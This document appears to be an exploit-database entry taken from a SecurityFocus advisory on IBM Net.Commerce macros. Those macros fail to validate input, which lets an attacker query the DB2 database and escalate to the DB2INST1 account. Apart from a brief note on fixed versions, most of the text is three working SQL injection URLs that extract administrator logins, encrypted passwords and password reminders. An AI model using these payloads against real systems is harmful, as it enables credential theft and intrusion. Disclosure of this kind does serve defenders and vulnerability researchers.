@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/2350/info
+
+IBM's Net.Commerce ecommerce platform supports macros which, by default, do not properly validate requests in user-supplied input. A thoughtfully-formed request to a vulnerable script can cause the server to disclose sensitive system information, including results of arbitrary queries to the Net.Commerce database. This can allow an attacker to obtain an elevation of privileges to that of the DB2INST1 account, and potentially issue arbitrary shell commands as the DB2INST1 user.
+
+IBM fixed the vulnerable macros they ship with the product in Net.Commerce Versions 3.2 and WebSphere Commerce Suite 4.1. Custom macros created by the user may be vulnerable to this type of attack. WebSphere Commerce Suite Version 5.1 is not vulnerable at all as it does not use Net.Data macros. 
+
+To obtain the administrator accounts use the following URL:
+
+http://target/cgi-bin/ncommerce3/ExecMacro/orderdspc.d2w/report?order_rn=99999+union+select+shlogid+as+mestname,0+from+shopper+where+shshtyp+%3d+'A';
+
+To obtain the encrypted passwords use the following URL:
+
+http://target/cgi-bin/ncommerce3/ExecMacro/orderdspc.d2w/report?order_rn=99999+union+select+shlpswd+as+mestname,0+from+shopper+where+shlogid+%3d+'ncadmin';
+
+To obtain the password reminders use the following URL:
+http://target/cgi-bin/ncommerce3/ExecMacro/orderdspc.d2w/report?order_rn=99999+union+select+shchaans+as+mestname,0+from+shopper+where+shlogid+%3d+'ncadmin';
+
+"orderdspc.d2w" is not the only vulnerable macro. It is just used as an example. Casting between different data-types is possible. Read the DB2 manual pages.
+
+It may also be possible to query other databases. 
